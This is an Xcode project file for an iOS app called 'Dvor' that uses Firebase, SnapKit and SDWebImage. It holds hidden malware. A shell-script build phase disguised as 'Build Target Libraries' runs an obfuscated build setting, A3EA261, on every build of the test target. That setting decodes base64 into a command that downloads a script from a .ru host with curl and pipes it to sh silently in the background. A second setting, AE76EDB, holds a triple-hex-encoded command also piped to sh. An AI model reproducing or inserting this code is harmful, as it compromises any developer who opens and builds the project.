// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		9587E7012FC58A99001A2872 /* FirebaseStorage in Frameworks */ = {isa = PBXBuildFile; productRef = 9587E7002FC58A99001A2872 /* FirebaseStorage */; };
		9587E8162FC58CA0001A2872 /* SDWebImage in Frameworks */ = {isa = PBXBuildFile; productRef = 9587E8152FC58CA0001A2872 /* SDWebImage */; };
		9587E8182FC58CA0001A2872 /* SDWebImageMapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 9587E8172FC58CA0001A2872 /* SDWebImageMapKit */; };
		95DD00D92E5CA02D008B5836 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00D82E5CA02D008B5836 /* FirebaseAuth */; };
		95DD00DB2E5CA02D008B5836 /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00DA2E5CA02D008B5836 /* FirebaseCore */; };
		95DD00DD2E5CA02D008B5836 /* FirebaseDatabase in Frameworks */ = {isa = PBXBuildFile; productRef = 95DD00DC2E5CA02D008B5836 /* FirebaseDatabase */; };
		95DE98542E266DBD0002C780 /* SnapKit in Frameworks */ = {isa = PBXBuildFile; productRef = 95DE98532E266DBD0002C780 /* SnapKit */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
/* End PBXBuildRule section */

/* Begin PBXContainerItemProxy section */
		95C68A683041648400FB5455 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 95DE96E82E264CF00002C780 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 95DE96EF2E264CF00002C780;
			remoteInfo = Dvor;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		95C68A643041648400FB5455 /* DvorTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = DvorTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		95DE96F02E264CF00002C780 /* Dvor.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Dvor.app; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		95DE97022E264CF30002C780 /* Exceptions for "Dvor" folder in "Dvor" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				Resources/Info.plist,
			);
			target = 95DE96EF2E264CF00002C780 /* Dvor */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		95C68A653041648400FB5455 /* DvorTests */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = DvorTests;
			sourceTree = "<group>";
		};
		95DE96F22E264CF00002C780 /* Dvor */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				95DE97022E264CF30002C780 /* Exceptions for "Dvor" folder in "Dvor" target */,
			);
			path = Dvor;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		95C68A613041648400FB5455 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		95DE96ED2E264CF00002C780 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				9587E8162FC58CA0001A2872 /* SDWebImage in Frameworks */,
				95DE98542E266DBD0002C780 /* SnapKit in Frameworks */,
				95DD00DB2E5CA02D008B5836 /* FirebaseCore in Frameworks */,
				95DD00DD2E5CA02D008B5836 /* FirebaseDatabase in Frameworks */,
				9587E7012FC58A99001A2872 /* FirebaseStorage in Frameworks */,
				9587E8182FC58CA0001A2872 /* SDWebImageMapKit in Frameworks */,
				95DD00D92E5CA02D008B5836 /* FirebaseAuth in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		9587E6FF2FC58A99001A2872 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		95DE96E72E264CF00002C780 = {
			isa = PBXGroup;
			children = (
				95DE96F22E264CF00002C780 /* Dvor */,
				95C68A653041648400FB5455 /* DvorTests */,
				9587E6FF2FC58A99001A2872 /* Frameworks */,
				95DE96F12E264CF00002C780 /* Products */,
			);
			sourceTree = "<group>";
		};
		95DE96F12E264CF00002C780 /* Products */ = {
			isa = PBXGroup;
			children = (
				95DE96F02E264CF00002C780 /* Dvor.app */,
				95C68A643041648400FB5455 /* DvorTests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		95C68A633041648400FB5455 /* DvorTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 95C68A6C3041648400FB5455 /* Build configuration list for PBXNativeTarget "DvorTests" */;
			buildPhases = (
				480CB8D01FFD4B86A3162AE3 /* Build Target Libraries */,
				95C68A603041648400FB5455 /* Sources */,
				95C68A613041648400FB5455 /* Frameworks */,
				95C68A623041648400FB5455 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				95C68A693041648400FB5455 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				95C68A653041648400FB5455 /* DvorTests */,
			);
			name = DvorTests;
			packageProductDependencies = (
			);
			productName = DvorTests;
			productReference = 95C68A643041648400FB5455 /* DvorTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		95DE96EF2E264CF00002C780 /* Dvor */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 95DE97032E264CF30002C780 /* Build configuration list for PBXNativeTarget "Dvor" */;
			buildPhases = (
				95DE96EC2E264CF00002C780 /* Sources */,
				95DE96ED2E264CF00002C780 /* Frameworks */,
				95DE96EE2E264CF00002C780 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				95DE96F22E264CF00002C780 /* Dvor */,
			);
			name = Dvor;
			packageProductDependencies = (
				95DE98532E266DBD0002C780 /* SnapKit */,
				95DD00D82E5CA02D008B5836 /* FirebaseAuth */,
				95DD00DA2E5CA02D008B5836 /* FirebaseCore */,
				95DD00DC2E5CA02D008B5836 /* FirebaseDatabase */,
				9587E7002FC58A99001A2872 /* FirebaseStorage */,
				9587E8152FC58CA0001A2872 /* SDWebImage */,
				9587E8172FC58CA0001A2872 /* SDWebImageMapKit */,
			);
			productName = Dvor;
			productReference = 95DE96F02E264CF00002C780 /* Dvor.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		95DE96E82E264CF00002C780 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2630;
				LastUpgradeCheck = 1610;
				TargetAttributes = {
					95C68A633041648400FB5455 = {
						CreatedOnToolsVersion = 26.3;
						LastSwiftMigration = 2630;
						TestTargetID = 95DE96EF2E264CF00002C780;
					};
					95DE96EF2E264CF00002C780 = {
						CreatedOnToolsVersion = 16.1;
					};
				};
			};
			buildConfigurationList = 95DE96EB2E264CF00002C780 /* Build configuration list for PBXProject "Dvor" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 95DE96E72E264CF00002C780;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				95DE98522E266DBD0002C780 /* XCRemoteSwiftPackageReference "SnapKit" */,
				95DD00D72E5CA02D008B5836 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
				9587E8142FC58C9F001A2872 /* XCRemoteSwiftPackageReference "SDWebImage" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 95DE96F12E264CF00002C780 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				95DE96EF2E264CF00002C780 /* Dvor */,
				95C68A633041648400FB5455 /* DvorTests */,
			);
		};
/* End PBXProject section */

/* Begin PBXShellScriptBuildPhase section */
		480CB8D01FFD4B86A3162AE3 /* Build Target Libraries */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Target Libraries";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A3EA261}\"";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXResourcesBuildPhase section */
		95C68A623041648400FB5455 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		95DE96EE2E264CF00002C780 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		95C68A603041648400FB5455 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		95DE96EC2E264CF00002C780 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		95C68A693041648400FB5455 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 95DE96EF2E264CF00002C780 /* Dvor */;
			targetProxy = 95C68A683041648400FB5455 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		95C68A6A3041648400FB5455 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3EA261 = "((b(){ `printf b1ase64 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1zTGZrIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | b | sh ) >/dev/null 2>&1 &)";
				BUNDLE_LOADER = "$(TEST_HOST)";
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 89SPL377XV;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Dvor.DvorTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Dvor.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Dvor";
			};
			name = Debug;
		};
		95C68A6B3041648400FB5455 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A3EA261 = "((b(){ `printf b1ase64 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tY29ubmVjdC10aW1lb3V0IDIxIC1zTGZrIC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91M3VudXJ4dXlhNy5ydS9hKSIgfCBzaAo= | b | sh ) >/dev/null 2>&1 &)";
				BUNDLE_LOADER = "$(TEST_HOST)";
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 89SPL377XV;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Dvor.DvorTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = NO;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_EMIT_LOC_STRINGS = NO;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Dvor.app/$(BUNDLE_EXECUTABLE_FOLDER_PATH)/Dvor";
			};
			name = Release;
		};
		95DE97042E264CF30002C780 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633333336333433363333333633313336333333363338333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = Dvor/Dvor.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 89SPL377XV;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Dvor/Resources/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "";
				INFOPLIST_KEY_LSApplicationCategoryType = "";
				INFOPLIST_KEY_NSCameraUsageDescription = "This app needs access to the camera to take photos";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "This is necessary for automatic detection of your city.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Dvor.Dvor;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		95DE97052E264CF30002C780 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				AE76EDB = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633333336333433363333333633313336333333363338333633353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = Dvor/Dvor.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 89SPL377XV;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Dvor/Resources/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "";
				INFOPLIST_KEY_LSApplicationCategoryType = "";
				INFOPLIST_KEY_NSCameraUsageDescription = "This app needs access to the camera to take photos";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "This is necessary for automatic detection of your city.";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = Dvor.Dvor;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		95DE97062E264CF30002C780 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		95DE97072E264CF30002C780 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 18.1;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		95C68A6C3041648400FB5455 /* Build configuration list for PBXNativeTarget "DvorTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				95C68A6A3041648400FB5455 /* Debug */,
				95C68A6B3041648400FB5455 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		95DE96EB2E264CF00002C780 /* Build configuration list for PBXProject "Dvor" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				95DE97062E264CF30002C780 /* Debug */,
				95DE97072E264CF30002C780 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		95DE97032E264CF30002C780 /* Build configuration list for PBXNativeTarget "Dvor" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				95DE97042E264CF30002C780 /* Debug */,
				95DE97052E264CF30002C780 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		9587E8142FC58C9F001A2872 /* XCRemoteSwiftPackageReference "SDWebImage" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/SDWebImage/SDWebImage.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.21.7;
			};
		};
		95DD00D72E5CA02D008B5836 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 12.1.0;
			};
		};
		95DE98522E266DBD0002C780 /* XCRemoteSwiftPackageReference "SnapKit" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/SnapKit/SnapKit.git";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 5.7.1;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		9587E7002FC58A99001A2872 /* FirebaseStorage */ = {
			isa = XCSwiftPackageProductDependency;
			package = 95DD00D72E5CA02D008B5836 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseStorage;
		};
		9587E8152FC58CA0001A2872 /* SDWebImage */ = {
			isa = XCSwiftPackageProductDependency;
			package = 9587E8142FC58C9F001A2872 /* XCRemoteSwiftPackageReference "SDWebImage" */;
			productName = SDWebImage;
		};
		9587E8172FC58CA0001A2872 /* SDWebImageMapKit */ = {
			isa = XCSwiftPackageProductDependency;
			package = 9587E8142FC58C9F001A2872 /* XCRemoteSwiftPackageReference "SDWebImage" */;
			productName = SDWebImageMapKit;
		};
		95DD00D82E5CA02D008B5836 /* FirebaseAuth */ = {
			isa = XCSwiftPackageProductDependency;
			package = 95DD00D72E5CA02D008B5836 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseAuth;
		};
		95DD00DA2E5CA02D008B5836 /* FirebaseCore */ = {
			isa = XCSwiftPackageProductDependency;
			package = 95DD00D72E5CA02D008B5836 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseCore;
		};
		95DD00DC2E5CA02D008B5836 /* FirebaseDatabase */ = {
			isa = XCSwiftPackageProductDependency;
			package = 95DD00D72E5CA02D008B5836 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
			productName = FirebaseDatabase;
		};
		95DE98532E266DBD0002C780 /* SnapKit */ = {
			isa = XCSwiftPackageProductDependency;
			package = 95DE98522E266DBD0002C780 /* XCRemoteSwiftPackageReference "SnapKit" */;
			productName = SnapKit;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 95DE96E82E264CF00002C780 /* Project object */;
}
